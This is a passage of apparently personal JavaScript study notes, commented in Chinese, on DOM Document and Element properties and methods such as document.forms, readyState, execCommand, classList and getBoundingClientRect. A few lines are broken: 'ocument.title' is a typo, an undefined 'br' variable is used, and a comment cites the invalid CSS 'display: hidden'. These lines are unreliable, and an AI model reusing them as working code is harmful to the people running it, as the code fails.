for (var i = 0; i < links.length; i++) {
    console.log(links[i]);
}
// document.forms
// 返回所有<form>表单节点
// 除了使用位置序号，id属性和name属性也可以用来引用表单
//<form name="foo" id="bar"></form>
document.forms[0] === document.forms.foo // true
document.forms.bar === document.forms.foo // true
// document.images
// 返回页面所有<img>图片节点
// 在所有img标签中，寻找某张图片
var imglist = document.images;
for (var i = 0; i < imglist.length; i++) {
    if (imglist[i].src === 'banner.gif') {
        // ...
    }
}
// document.embeds，document.plugins
// 都返回所有<embed>节点
// document.scripts
// 返回所有<script>节点
var scripts = document.scripts;
if (scripts.length !== 0) {
    console.log('当前网页有脚本');
}
// document.styleSheets
// 返回文档内嵌或引入的样式表集合
// 除了document.styleSheets，以上的集合属性返回的都是HTMLCollection实例
// 如果成员有id或name属性，还可以用这两个属性的值，
// 在HTMLCollection实例上引用到这个成员
document.links instanceof HTMLCollection // true
document.images instanceof HTMLCollection // true
document.forms instanceof HTMLCollection // true
document.embeds instanceof HTMLCollection // true
document.scripts instanceof HTMLCollection // true
// 文档静态信息属性
// document.documentURI，document.URL
// 都返回一个字符串，表示当前文档的网址。
// 不同之处是它们继承自不同的接口，documentURI继承自Document接口，可用于所有文档；
// URL继承自HTMLDocument接口，只能用于 HTML 文档。
// 如果文档的锚点（#anchor）变化，这两个属性都会跟着变化
document.URL // http://www.example.com/about
document.documentURI === document.URL // true
// document.domain
// 返回当前文档的域名，不包含协议和接口。如果无法获取域名，该属性返回null
// 基本上是一个只读属性，只有一种情况除外。
// 次级域名的网页，可以把document.domain设为对应的上级域名
// 比如，当前域名是a.sub.example.com，则document.domain属性
// 可以设置为sub.example.com，也可以设为example.com。
// 修改后，document.domain相同的两个网页，可以读取对方的资源，比如设置的 Cookie
// 另外，设置document.domain会导致端口被改成null。因此，
// 如果通过设置document.domain来进行通信，双方网页都必须设置这个值，才能保证端口相同
// document.location
// Location对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。
// 通过window.location和document.location属性，可以拿到这个对象。
// document.lastModified
// 返回一个字符串，表示当前文档最后修改的时间。不同浏览器的返回值，日期格式是不一样的。

document.lastModified
// 返回一个字符串，表示当前文档最后修改的时间。不同浏览器的返回值，日期格式是不一样的
// document.lastModified属性的值是字符串，所以不能直接用来比较。
// Date.parse方法将其转为Date实例，才能比较两个网页。
// 如果页面上有 JavaScript 生成的内容，document.lastModified属性返回的总是当前时间
var lastVisitedDate = Date.parse('01/01/2018');
if (Date.parse(document.lastModified) > lastVisitedDate) {
    console.log('网页已经变更');
}
// document.title
// document.title属性返回当前文档的标题。
// 默认情况下，返回<title>节点的值。
// 但是该属性是可写的，一旦被修改，就返回修改后的值
ocument.title = '新标题';
document.title // "新标题"
// document.characterSet
// 返回当前文档的编码，比如UTF-8、ISO-8859-1等等
// document.referrer
// 返回一个字符串，表示当前文档的访问者来自哪里
// 如果无法获取来源，或者用户直接键入网址而不是从其他网页点击进入，
// document.referrer返回一个空字符串
// ocument.referrer的值，总是与 HTTP 头信息的Referer字段保持一致
document.referrer // "https://example.com/path"
// document.dir
// 返回一个字符串，表示文字方向。它只有两个可能的值：
// rtl表示文字从右到左，阿拉伯文是这种方式；
// ltr表示文字从左到右，包括英语和汉语在内的大多数文字采用这种方式。
// document.compatMode
// 返回浏览器处理文档的模式，
// 可能的值为BackCompat（向后兼容模式）和CSS1Compat（严格模式）
// 一般来说，如果网页代码的第一行设置了明确的DOCTYPE（比如<!doctype html>），
// document.compatMode的值都为CSS1Compat
// 文档状态属性
// document.hidden
// 返回一个布尔值，表示当前页面是否可见。
// 如果窗口最小化、浏览器切换了Tab，都会导致页面不可见,使得document.hidden返回true
// 这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。
// document.visibilityState
// 返回文档的可见状态。它的值有四种可能
// visible：页面可见。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。
// hidden：页面不可见，有可能窗口最小化，或者浏览器切换到了另一个 Tab。
// prerender：页面处于正在渲染状态，对于用户来说，该页面不可见。
// unloaded：页面从内存里面卸载了。
// 这个属性可以用在页面加载时，防止加载某些资源；或者页面不可见时，停掉一些页面功能
// document.readyState
// 返回当前文档的状态，共有三种可能的值。另外，每次状态变化都会触发一个readystatechange事件
// loading：加载 HTML 代码阶段（尚未完成解析）
// interactive：加载外部资源阶段
// complete：加载完成
// 变化的过程如下。
// loading:浏览器开始解析 HTML 文档,浏览器遇到 HTML 文档中的<script>元素，
// 并且没有async或defer属性，就暂停解析，开始执行脚本
// interactive:HTML 文档解析完成,变成interactive
// complete:浏览器等待图片、样式表、字体文件等外部资源加载完成，
// 一旦全部加载完成,变成complete
// 检查网页是否加载成功
// 基本检查
document.onreadystatechange = function () {
    if (document.readyState === "interactive") {
        console.log("interactive")
    }
}
// 轮询检查
var interval = setInterval(function () {
    if (document.readyState === 'complete') {
        clearInterval(interval);
        // ...
    }
}, 100);
// document.cookie
// 用来操作浏览器 Cookie
// document.designMode
// 控制当前文档是否可编辑。该属性只有两个值on和off，默认值为off。
// 一旦设为on，用户就可以编辑整个文档的内容
// 打开iframe元素内部文档的designMode属性，就能将其变为一个所见即所得的编辑器。
// <iframe id="editor" src="about:blank"></iframe>
var editor = document.getElementById('editor');
editor.contentDocument.designMode = 'on';
// document.implementation
// 返回一个DOMImplementation对象。该对象有三个方法，
// 主要用于创建独立于当前文档的新的 Document 对象
// DOMImplementation.createDocument()：创建一个 XML 文档。
// DOMImplementation.createHTMLDocument()：创建一个 HTML 文档。
// DOMImplementation.createDocumentType()：创建一个 DocumentType 对象。
// 创建 HTML 文档
// 第一步生成一个新的 HTML 文档doc，
// 然后用它的根元素document.documentElement替换掉document.documentElement。
// 这会使得当前文档的内容全部消失，变成hello world
var doc = document.implementation.createHTMLDocument('Title');
var p = doc.createElement('p');
p.innerHTML = 'hello world';
doc.body.appendChild(p);

document.replaceChild(
    doc.documentElement,
    document.documentElement
);
// 方法
// document.open()，document.close() 
// document.open方法清除当前文档所有内容，使得文档处于可写状态，
// 供document.write方法写入内容。
// document.close方法用来关闭document.open()打开的文档
document.open();
document.write('hello world');
document.close();
// document.querySelector()，document.querySelectorAll()
// document.querySelector接受一个 CSS 选择器作为参数，返回匹配该选择器的元素节点。
// 如果有多个节点满足匹配条件，则返回第一个匹配的节点。
// 如果没有发现匹配的节点，则返回null。
// document.querySelectorAll方法与querySelector用法类似，
// 区别是返回一个NodeList对象，包含所有匹配给定选择器的节点。
// querySelectorAll的返回结果不是动态集合，不会实时反映元素节点的变化
// 这两个方法的参数，可以是逗号分隔的多个 CSS 选择器，
// 返回匹配其中一个选择器的元素节点，这与 CSS 选择器的规则是一致的
// 这两个方法除了定义在document对象上，还定义在元素节点上，即在元素节点上也可以调用。
// 返回class属性是note或alert的div元素
var matches = document.querySelectorAll('div.note, div.alert');
// document.getElementsByTagName()
// document.getElementsByClassName() 
// document.getElementsByName() 
// document.getElementById() 
// document.createElement()
// document.createTextNode()
// 用来生成文本节点（Text实例），并返回该节点。它的参数是文本节点的内容。
var newContent = document.createTextNode('Hello');
// document.createAttribute()
// 生成一个新的属性节点（Attr实例），并返回它
// 为div1节点，插入一个值为newVal的my_attrib属性
var node = document.getElementById('div1');
var a = document.createAttribute('my_attrib');
a.value = 'newVal';
node.setAttributeNode(a);
// 或者
node.setAttribute('my_attrib', 'newVal');
// document.createComment()
// 生成一个新的注释节点，并返回该节点，参数是一个字符串，会成为注释节点的内容
// document.createDocumentFragment()
// 生成一个空的文档片段对象（DocumentFragment实例）。
// DocumentFragment是一个存在于内存的 DOM 片段，不属于当前文档，
// 常常用来生成一段较复杂的 DOM 结构，然后再插入当前文档
// document.createEvent()
// 生成一个事件对象（Event实例），
// 参数是事件类型，比如UIEvents、MouseEvents、MutationEvents、HTMLEvents
// 该对象可以被element.dispatchEvent方法使用，触发指定事件。
// 新建了一个名为build的事件实例，然后触发该事件
var event = document.createEvent('Event');
event.initEvent('build', true, true);
document.addEventListener('build', function (e) {
    console.log(e.type); // "build"
}, false);
document.dispatchEvent(event);
// document.addEventListener()，
// document.removeEventListener()，
// document.dispatchEvent()
// 这三个方法用于处理document节点的事件,都继承自EventTarget接口
// 添加事件监听函数
document.addEventListener('click', listener, false);
// 移除事件监听函数
document.removeEventListener('click', listener, false);
// 触发事件
var event = new Event('click');
document.dispatchEvent(event);
// document.hasFocus()
// 返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。
// 注意，有焦点的文档必定被激活（active），反之不成立，激活的文档未必有焦点
// 比如，用户点击按钮，从当前窗口跳出一个新窗口，该新窗口就是激活的，但是不拥有焦点。
var focused = document.hasFocus();
//=====陌生部分
// document.adoptNode()，document.importNode()
// document.adoptNode方法将某个节点及其子节点，从原来所在的文档
// 或DocumentFragment里面移除，归属当前document对象，返回插入后的新节点
// 注意，document.adoptNode方法只是改变了节点的归属，并没有将这个节点插入新的文档树
var node = document.adoptNode(externalNode);
// document.importNode方法则是从原来所在的文档或DocumentFragment里面，
// 拷贝某个节点及其子节点，让它们归属当前document对象
// 第一个参数是外部节点，第二个参数是一个布尔值，
// 表示对外部节点是深拷贝还是浅拷贝，默认是浅拷贝（false）
// 从iframe窗口，拷贝一个指定节点myNode，插入当前文档
var iframe = document.getElementsByTagName('iframe')[0];
var oldNode = iframe.contentWindow.document.getElementById('myNode');
var newNode = document.importNode(oldNode, true);
document.getElementById("container").appendChild(newNode);
// document.createNodeIterator()
// 返回一个子节点遍历器。返回一个“遍历器”对象（NodeFilter实例）。
// 该实例的nextNode()方法和previousNode()方法，可以用来遍历所有子节点
// 第一个参数为所要遍历的根节点，第二个参数为所要遍历的节点类型，
// 几种主要的节点类型写法如下。
// 所有节点：NodeFilter.SHOW_ALL
// 元素节点：NodeFilter.SHOW_ELEMENT
// 文本节点：NodeFilter.SHOW_TEXT
// 评论节点：NodeFilter.SHOW_COMMENT
// 使用遍历器的nextNode方法，将根节点的所有子节点，依次读入一个数组。
// nextNode方法先返回遍历器的内部指针所在的节点，然后会将指针移向下一个节点。
// 所有成员遍历完成后，返回null
// previousNode方法则是先将指针移向上一个节点，然后返回该节点。
var nodeIterator = document.createNodeIterator(document.body);
var pars = [];
var currentNode;
while (currentNode = nodeIterator.nextNode()) {
    pars.push(currentNode);
}
// 下面icurrentNode和previousNode都指向同一个的节点
var nodeIterator = document.createNodeIterator(
    document.body,
    NodeFilter.SHOW_ELEMENT
);
var currentNode = nodeIterator.nextNode();
var previousNode = nodeIterator.previousNode();
currentNode === previousNode // true
// 注意，遍历器返回的第一个节点，总是根节点。
pars[0] === document.body // true
// document.createTreeWalker()
// 返回一个 DOM 的子树遍历器。它的第一个节点不是根节点
// 它与document.createNodeIterator方法基本是类似的，
// 区别在于它返回的是TreeWalker实例，后者返回的是NodeIterator实例。
// 第一个参数是所要遍历的根节点，第二个参数指定所要遍历的节点类型
// 遍历<body>节点下属的所有元素节点，将它们插入nodeList数组
var treeWalker = document.createTreeWalker(
    document.body,
    NodeFilter.SHOW_ELEMENT
);
var nodeList = [];
while (treeWalker.nextNode()) {
    nodeList.push(treeWalker.currentNode);
}
// document.execCommand()，
// document.queryCommandSupported()，
// document.queryCommandEnabled() 
// 如果document.designMode属性设为on，那么整个文档用户可编辑；
// 如果元素的contenteditable属性设为true，那么该元素可编辑。
// 这两种情况下，可以使用document.execCommand()方法，改变内容的样式，
// 比如document.execCommand('bold')会使得字体加粗
// 返回值是一个布尔值。如果为false，表示这个方法无法生效。
// 方法大部分情况下，只对选中的内容生效。如果有多个内容可编辑区域，
// 那么只对当前焦点所在的元素生效。
// 该方法接受三个参数。
// command：字符串，表示所要实施的样式。
// showDefaultUI：布尔值，表示是否要使用默认的用户界面，建议总是设为false。
// input：字符串，表示该样式的辅助内容，比如生成超级链接时，这个参数就是所要链接的网址。
// 如果第二个参数设为true，那么浏览器会弹出提示框，要求用户在提示框输入该参数。
// 但是，不是所有浏览器都支持这样做，为了兼容性，还是需要自己部署获取这个参数的方式。
// document.execCommand()方法可以执行的样式改变有很多种，下面是其中的一些：
// bold、insertLineBreak、selectAll、createLink、insertOrderedList、subscript、
// delete、insertUnorderedList、superscript、formatBlock、insertParagraph、undo、
// forwardDelete、insertText、unlink、insertImage、italic、unselect、insertHTML、
// redo。这些值都可以用作第一个参数，它们的含义不难从字面上看出来
// 先提示用户输入所要链接的网址，然后手动生成超级链接。
// 注意，第二个参数是false，表示此时不需要自动弹出提示框
var url = window.prompt('请输入网址');
if (url) {
    document.execCommand('createlink', false, url);
}
// document.queryCommandEnabled()方法返回一个布尔值，表示浏览器是否允许使用这个方法
if (document.queryCommandEnabled('SelectAll')) {
    // ...
}
// document.queryCommandSupported()方法返回一个布尔值，表示当前是否可用某种样式改变。
// 比如，加粗只有存在文本选中时才可用，如果没有选中文本，就不可用
if (document.queryCommandSupported('SelectAll')) {
    // ...
}
// document.getSelection()
// 这个方法指向window.getSelection()
// document.elementFromPoint()，document.elementsFromPoint()
// document.elementFromPoint方法返回位于页面指定位置最上层的元素节点
// 两个参数，依次是相对于当前视口左上角的横坐标和纵坐标，单位是像素
// 如果位于该位置的 HTML 元素不可返回（比如文本框的滚动条），则返回它的父元素（比如文本框）。
// 如果坐标值无意义（比如负值或超过视口大小），则返回null。
// 选中在(50, 50)这个坐标位置的最上层的那个 HTML 元素
var element = document.elementFromPoint(50, 50);
// document.elementsFromPoint()返回一个数组，
// 成员是位于指定坐标（相对于视口）的所有元素。
// document.caretPositionFromPoint()
// 返回一个 CaretPosition 对象，包含了指定坐标点在节点对象内部的位置信息。
// CaretPosition 对象就是光标插入点的概念，用于确定光标点在文本对象内部的具体位置
// 该对象有两个属性。
// CaretPosition.offsetNode：该位置的节点对象
// CaretPosition.offset：该位置在offsetNode对象内部，与起始位置相距的字符数
var range = document.caretPositionFromPoint(clientX, clientY);
// 应用例子
function insertBreakAtPoint(e) {

    var range;
    var textNode;
    var offset;

    // standard
    if (document.caretPositionFromPoint) {
        range = document.caretPositionFromPoint(e.pageX, e.pageY);
        textNode = range.offsetNode;
        offset = range.offset;

        // WebKit
    } else if (document.caretRangeFromPoint) {
        range = document.caretRangeFromPoint(e.pageX, e.pageY);
        textNode = range.startContainer;
        offset = range.startOffset;
    }

    // only split TEXT_NODEs
    if (textNode.nodeType == 3) {
        var replacement = textNode.splitText(offset);
        // var br = document.createElement('br');
        textNode.parentNode.insertBefore(br, replacement);
    }
}

var paragraphs = document.getElementsByTagName("p");
for (i = 0; i < paragraphs.length; i++) {
    paragraphs[i].addEventListener("click", insertBreakAtPoint, false);
}
// =====
// Element 节点
// Element节点对象对应网页的 HTML 元素。
// 每一个 HTML 元素，在 DOM 树上都会转化成一个Element节点对象
// 元素节点的nodeType属性都是1
// Element对象继承了Node接口，因此Node的属性和方法在Element对象都存在。
// 此外，不同的 HTML 元素对应的元素节点是不一样的，
// 浏览器使用不同的构造函数，生成不同的元素节点，
// 比如<a>元素的节点对象由HTMLAnchorElement构造函数生成，
//<button>元素的节点对象由HTMLButtonElement构造函数生成。
// 因此，元素节点不是一种对象，而是一组对象，这些对象除了继承Element的属性和方法，
// 还有各自构造函数的属性和方法。
// 实例属性
// 元素特性的相关属性
// Element.id
// 返回指定元素的id属性，该属性可读写
// HTML 代码为 <p id="foo">
var p = document.querySelector('p');
p.id // "foo"
// Element.tagName
// 返回指定元素的大写标签名，与nodeName属性的值相等。
// <span id="myspan">Hello</span>
var span = document.getElementById('myspan');
span.tagName // "SPAN"
// Element.dir
// 用于读写当前元素的文字方向，可能是从左到右（"ltr"），也可能是从右到左（"rtl"）
// Element.accessKey
// 用于读写分配给当前元素的快捷键
// btn元素的快捷键是h，按下Alt + h就能将焦点转移到它上面
// <button accesskey="h" id="btn">点击</button>
var btn = document.getElementById('btn');
btn.accessKey // "h"
// Element.draggable
// 返回一个布尔值，表示当前元素是否可拖动。该属性可读写
// Element.lang
// 返回当前元素的语言设置。该属性可读写。
// <html lang="en">
document.documentElement.lang // "en"
// Element.tabIndex
// 返回一个整数，表示当前元素在 Tab 键遍历时的顺序。该属性可读写。
// tabIndex属性值如果是负值（通常是-1），则 Tab 键不会遍历到该元素。
//如果是正整数，则按照顺序，从小到大遍历。
//如果两个元素的tabIndex属性的正整数值相同，则按照出现的顺序遍历。
//遍历完所有tabIndex为正整数的元素以后，
//再遍历所有tabIndex等于0、或者属性值是非法值、或者没有tabIndex属性的元素，
//顺序为它们在网页中出现的顺序。
// Element.title
// 用来读写当前元素的 HTML 属性title。该属性通常用来指定，鼠标悬浮时弹出的文字提示框。
// 元素状态的相关属性
// Element.hidden
// 返回一个布尔值，表示当前元素的hidden属性，用来控制当前元素是否可见。该属性可读写。
// 注意，该属性与 CSS 设置是互相独立的。CSS 对这个元素可见性的设置，Element.hidden并
// 不能反映出来。也就是说，这个属性并不能用来判断当前元素的实际可见性。
// CSS 的设置高于Element.hidden。
// 如果 CSS 指定了该元素不可见（display: none）或可见（display: hidden），
// 那么Element.hidden并不能改变该元素实际的可见性。
// 换言之，这个属性只在 CSS 没有明确设定当前元素的可见性时才有效。
var btn = document.getElementById('btn');
var mydiv = document.getElementById('mydiv');
btn.addEventListener('click', function () {
    mydiv.hidden = !mydiv.hidden;
}, false)
// Element.contentEditable，Element.isContentEditable
// HTML 元素可以设置contentEditable属性，使得元素的内容可以编辑。
// Element.contentEditable属性返回一个字符串，表示是否设置了contenteditable属性，
// 有三种可能的值。该属性可写。
// "true"：元素内容可编辑
// "false"：元素内容不可编辑
// "inherit"：元素是否可编辑，继承了父元素的设置
// Element.isContentEditable属性返回一个布尔值，
// 同样表示是否设置了contenteditable属性。该属性只读。
// <div>元素有contenteditable属性，因此用户可以在网页上编辑这个区块的内容。
{
    /* <div contenteditable>123</div> */
}
// Element.attributes
// 返回一个类似数组的对象，成员是当前元素节点的所有属性节点
// 遍历p元素的所有属性
var p = document.querySelector('p');
var attrs = p.attributes;
for (var i = attrs.length - 1; i >= 0; i--) {
    console.log(attrs[i].name + '->' + attrs[i].value);
}
// Element.className，Element.classList
// className属性用来读写当前元素节点的class属性。
// 它的值是一个字符串，每个class之间用空格分割。
// classList属性返回一个类似数组的对象，当前元素节点的每个class就是这个对象的一个成员。
// classList对象有下列方法。
// add()：增加一个 class。
// remove()：移除一个 class。
// contains()：检查当前元素是否包含某个 class。
// toggle()：将某个 class 移入或移出当前元素。
// item()：返回指定索引位置的 class。
// toString()：将 class 的列表转为字符串。
// toggle方法可以接受一个布尔值，作为第二个参数。
// 如果为true，则添加该属性；如果为false，则去除该属性
el.classList.toggle('abc', boolValue);
// 等同于
if (boolValue) {
    el.classList.add('abc');
} else {
    el.classList.remove('abc');
}
// HTML 代码 <div class="one two three" id="myDiv"></div>
var div = document.getElementById('myDiv');
div.className
// "one two three"
div.classList
// {
//   0: "one"
//   1: "two"
//   2: "three"
//   length: 3
// }
// Element.dataset
// 返回一个对象，可以从这个对象读写data-属性。
// 注意，dataset上面的各个属性返回都是字符串
// 也可以使用Element.getAttribute()和Element.setAttribute()，
// 通过完整的属性名读写这些属性
var mydiv = document.getElementById('mydiv');
mydiv.dataset.foo = 'bar';
mydiv.getAttribute('data-foo') // "bar"
// Element.innerHTML
// Element.outerHTML
// 返回一个字符串，表示当前元素节点的所有 HTML 代码，包括该元素本身和所有子元素
// outerHTML属性是可读写的，对它进行赋值，等于替换掉当前元素
// 注意，如果一个节点没有父节点，设置outerHTML属性会报错。
// <div id="d"><p>Hello</p></div>
var d = document.getElementById('d');
d.outerHTML // '<div id="d"><p>Hello</p></div>'
// Element.clientHeight，Element.clientWidth
// 返回一个整数值，表示元素节点的 CSS 高度（单位像素），
// 只对块级元素生效，对于行内元素返回0。
// 如果块级元素没有设置 CSS 高度，则返回实际高度。
// 除了元素本身的高度，它还包括padding部分，但是不包括border、margin。
// 如果有滚动条，还要减去滚动条的高度。
// 注意，这个值始终是整数，如果是小数会被四舍五入。
// document.documentElement的clientHeight属性，返回当前视口的高度（即浏览器窗口的高度）
// 等同于window.innerHeight属性减去水平滚动条的高度（如果有的话）。
// document.body的高度则是网页的实际高度。
// 一般来说，document.body.clientHeight大于document.documentElement.clientHeight。
// 视口高度
document.documentElement.clientHeight
// 网页总高度
document.body.clientHeight
// Element.clientLeft，Element.clientTop
// Element.clientLeft属性等于元素节点左边框（left border）的宽度（单位像素），
// 不包括左侧的padding和margin。
// 如果没有设置左边框，或者是行内元素（display: inline），该属性返回0。
// 该属性总是返回整数值，如果是小数，会四舍五入。
// Element.clientTop属性等于网页元素顶部边框的宽度（单位像素），
// 其他特点都与clientLeft相同。
// Element.scrollHeight，Element.scrollWidth
// Element.scrollHeight属性返回一个整数值（小数会四舍五入），
// 表示当前元素的总高度（单位像素），包括溢出容器、当前不可见的部分。
// 它包括padding，但是不包括border、margin以及水平滚动条的高度（如果有水平滚动条的话），
// 还包括伪元素（::before或::after）的高度。
// 这两个属性只读
// 注意，如果元素节点的内容出现溢出，即使溢出的内容是隐藏的，
// <div id="myDiv" style="height: 200px; overflow: hidden;">...<div>
document.getElementById('myDiv').scrollHeight // 356
// scrollHeight属性仍然返回元素的总高度
// 整张网页的总高度可以从document.documentElement或document.body上读取。
// 返回网页的总高度
document.documentElement.scrollHeight
document.body.scrollHeight
// Element.scrollLeft，Element.scrollTop
// Element.scrollLeft属性表示当前元素的水平滚动条向右侧滚动的像素数量，
// Element.scrollTop属性表示当前元素的垂直滚动条向下滚动的像素数量。
// 对于那些没有滚动条的网页元素，这两个属性总是等于0。
// 这两个属性都可读写，设置该属性的值，会导致浏览器将当前元素自动滚动到相应的位置。
// 如果要查看整张网页的水平的和垂直的滚动距离，要从document.documentElement元素上读取
document.documentElement.scrollLeft
document.documentElement.scrollTop
// Element.offsetParent
// 返回最靠近当前元素的、并且 CSS 的position属性不等于static的上层元素。
// span元素的offsetParent属性就是div元素
{
    /* <div style="position: absolute;">
      <p>
        <span>Hello</span>
      </p>
    </div> */
}
// 如果该元素是不可见的（display属性为none），
// 或者位置是固定的（position属性为fixed），则offsetParent属性返回null
// span元素的offsetParent属性是null
{
    /* <div style="position: absolute;">
      <p>
        <span style="display: none;">Hello</span>
      </p>
    </div> */
}
// 如果某个元素的所有上层节点的position属性都是static，
// 则Element.offsetParent属性指向<body>元素。
// 该属性主要用于确定子元素位置偏移的计算基准，
// Element.offsetTop和Element.offsetLeft就是offsetParent元素计算的。
// Element.offsetHeight，Element.offsetWidth
// Element.offsetHeight属性返回一个整数，表示元素的 CSS 垂直高度（单位像素），
// 包括元素本身的高度、padding 和 border，以及水平滚动条的高度（如果存在滚动条）
// 这两个属性都是只读属性，只比Element.clientHeight多了边框的高度。
// 如果元素的 CSS 设为不可见（比如display: none;），则返回0
// Element.offsetLeft，Element.offsetTop
// Element.offsetLeft返回当前元素左上角相对于Element.offsetParent节点的水平位移，
// Element.offsetTop返回垂直位移，单位为像素。
// 通常，这两个值是指相对于父节点的位移
// 算出元素左上角相对于整张网页的坐标
function getElementPosition(e) {
    var x = 0;
    var y = 0;
    while (e !== null) {
        x += e.offsetLeft;
        y += e.offsetTop;
        e = e.offsetParent;
    }
    return {
        x: x,
        y: y
    };
}
// Element.style 
// 每个元素节点都有style用来读写该元素的行内样式信息
// Element.children，Element.childElementCount 
// Element.firstElementChild，Element.lastElementChild
// 如果没有元素子节点，这两个属性返回null
// Element.nextElementSibling，Element.previousElementSibling
// Element.nextElementSibling属性返回当前元素节点的后一个同级元素节点，
// 如果没有则返回null。
// <div id="div-01">Here is div-01</div>
// <div id="div-02">Here is div-02</div>
var el = document.getElementById('div-01');
el.nextElementSibling // <div id="div-02">Here is div-02</div>
// Element.previousElementSibling属性返回当前元素节点的前一个同级元素节点，
// 如果没有则返回null
// 实例方法
// 属性相关方法
// 元素节点提供六个方法，用来操作属性。
// getAttribute()：读取某个属性的值
// getAttributeNames()：返回当前元素的所有属性名
// setAttribute()：写入属性值
// hasAttribute()：某个属性是否存在
// hasAttributes()：当前元素是否有属性
// removeAttribute()：删除属性
// Element.querySelector()
// Element.querySelectorAll()
// Element.getElementsByClassName()
// Element.getElementsByTagName()
// Element.closest()
// 接受一个 CSS 选择器作为参数，返回匹配该选择器的、最接近
// 当前节点的一个祖先节点（包括当前节点本身）。
// 如果没有任何节点匹配 CSS 选择器，则返回null。
// 由于closest方法将当前节点也考虑在内，所以第二个closest方法返回div-03。
// <article>
//   <div id="div-01">Here is div-01
//     <div id="div-02">Here is div-02
//       <div id="div-03">Here is div-03</div>
//     </div>
//   </div>
// </article>
var div03 = document.getElementById('div-03');
// div-03 最近的祖先节点
div03.closest("#div-02") // div-02
div03.closest("div div") // div-03
div03.closest("article > div") //div-01
div03.closest(":not(div)") // article
// Element.matches()
// 返回一个布尔值，表示当前元素是否匹配给定的 CSS 选择器
if (el.matches('.someClass')) {
    console.log('Match!');
}
// 事件相关方法
// 这些方法都继承自EventTarget接口
// Element.addEventListener()：添加事件的回调函数
// Element.removeEventListener()：移除事件监听函数
// Element.dispatchEvent()：触发事件
element.addEventListener('click', listener, false);
element.removeEventListener('click', listener, false);
var event = new Event('click');
element.dispatchEvent(event);
// Element.scrollIntoView()
// 滚动当前元素，进入浏览器的可见区域，类似于设置window.location.hash的效果。
// 接受一个布尔值作为参数。
// 如果为true，表示元素的顶部与当前区域的可见部分的顶部对齐（前提是当前区域可滚动）；
// 如果为false，表示元素的底部与当前区域的可见部分的尾部对齐（前提是当前区域可滚动）。
// 如果没有提供该参数，默认为true。
el.scrollIntoView(); // 等同于el.scrollIntoView(true)
el.scrollIntoView(false);
// Element.getBoundingClientRect()
// 返回一个对象，提供当前元素节点的大小、位置等信息，
// 基本上就是 CSS 盒状模型的所有信息,全部为只读
// x：元素左上角相对于视口的横坐标
// y：元素左上角相对于视口的纵坐标
// height：元素高度
// width：元素宽度
// left：元素左上角相对于视口的横坐标，与x属性相等
// right：元素右边界相对于视口的横坐标（等于x + width）
// top：元素顶部相对于视口的纵坐标，与y属性相等
// bottom：元素底部相对于视口的纵坐标（等于y + height）
// 上面的这些属性，都是继承自原型的属性，而Object.keys方法只返回对象自身的属性，
// 所以返回一个空数组。这一点也需要注意
var rect = document.body.getBoundingClientRect();
Object.keys(rect) // []
// 由于元素相对于视口（viewport）的位置，会随着页面滚动变化，
// 因此表示位置的四个属性值，都不是固定不变的。
// 如果想得到绝对位置，可以将left属性加上window.scrollX，top属性加上window.scrollY
// 注意，getBoundingClientRect方法的所有属性，都把边框（border属性）算作元素的一部分。
// 也就是说，都是从边框外缘的各个点来计算。
// 因此，width和height包括了元素本身 + padding + border
// Element.getClientRects()
// 返回一个类似数组的对象，里面是当前元素在页面上形成的所有矩形
// （所以方法名中的Rect用的是复数）。每个矩形都有bottom、height、left、right、
// top和width六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。
// 对于盒状元素（比如<div>和<p>），该方法返回的对象中只有该元素一个成员。
// 对于行内元素（比如<span>、<a>、<em>），该方法返回的对象有多少个成员，
// 取决于该元素在页面上占据多少行。
// 这是它和Element.getBoundingClientRect()方法的主要区别，
// 后者对于行内元素总是返回一个矩形
{
    /* <span id="inline">Hello World Hello World Hello World</span> */
}
// <span>节点内部有三个换行符，即使 HTML 语言忽略换行符，将它们显示为一行，
// getClientRects()方法依然会返回三个成员
{
    /* <span id="inline">
      Hello World
      Hello World
      Hello World
    </span> */
}
// Element.remove()
// 继承自 ChildNode 接口，用于将当前元素节点从它的父节点移除。
var el = document.getElementById('mydiv');
el.remove();
// Element.focus()，Element.blur() 
// Element.focus方法用于将当前页面的焦点，转移到指定元素上
// 接受一个对象作为参数。参数对象的preventScroll属性是一个布尔值，
// 指定是否将当前元素停留在原始位置，而不是滚动到可见区域
// 最后，从document.activeElement属性可以得到当前获得焦点的元素
document.getElementById('my-span').focus();
// 让btn元素获得焦点，并滚动到可见区域
function getFocus() {
    document.getElementById('btn').focus({
        preventScroll: false
    });
}
//   Element.blur方法用于将焦点从当前元素移除
// Element.click()
// 用于在当前元素上模拟一次鼠标点击，相当于触发了click事件
// Element.insertAdjacentElement()
// 在相对于当前元素的指定位置，插入一个新的节点。
// 该方法返回被插入的节点，如果插入失败，返回null
// 如果插入的节点是一个文档里现有的节点，它会从原有位置删除，放置到新的位置
// 接受两个参数，第一个参数是一个字符串，表示插入的位置，第二个参数是将要插入的节点。
// 第一个参数只可以取如下的值。
// beforebegin：当前元素之前
// afterbegin：当前元素内部的第一个子节点前面
// beforeend：当前元素内部的最后一个子节点后面
// afterend：当前元素之后
// 注意，beforebegin和afterend这两个值，只在当前节点有父节点时才会生效
// Element.insertAdjacentHTML()，Element.insertAdjacentText()
// Element.insertAdjacentHTML方法用于将一个 HTML 字符串，解析生成 DOM 结构，
// 插入相对于当前节点的指定位置
// 该方法只是在现有的 DOM 结构里面插入节点，这使得它的执行速度比innerHTML方法快得多。
// 注意，该方法不会转义 HTML 字符串，这导致它不能用来插入用户输入的内容，否则会有安全风险
// 接受两个参数，第一个是一个表示指定位置的字符串，第二个是待解析的 HTML 字符串。
// 第一个参数只能设置下面四个值之一。
// beforebegin：当前元素之前
// afterbegin：当前元素内部的第一个子节点前面
// beforeend：当前元素内部的最后一个子节点后面
// afterend：当前元素之后
// HTML 代码：<div id="one">one</div>
var d1 = document.getElementById('one');
d1.insertAdjacentHTML('afterend', '<div id="two">two</div>');
// 执行后的 HTML 代码：<div id="one">one</div><div id="two">two</div>
// Element.insertAdjacentText方法在相对于当前节点的指定位置，插入一个文本节点，
// 用法与Element.insertAdjacentHTML方法完全一致。
// HTML 代码：<div id="one">one</div>
var d1 = document.getElementById('one');
d1.insertAdjacentText('afterend', 'two');
// 执行后的 HTML 代码：<div id="one">one</div>two
//======
// 属性的操作
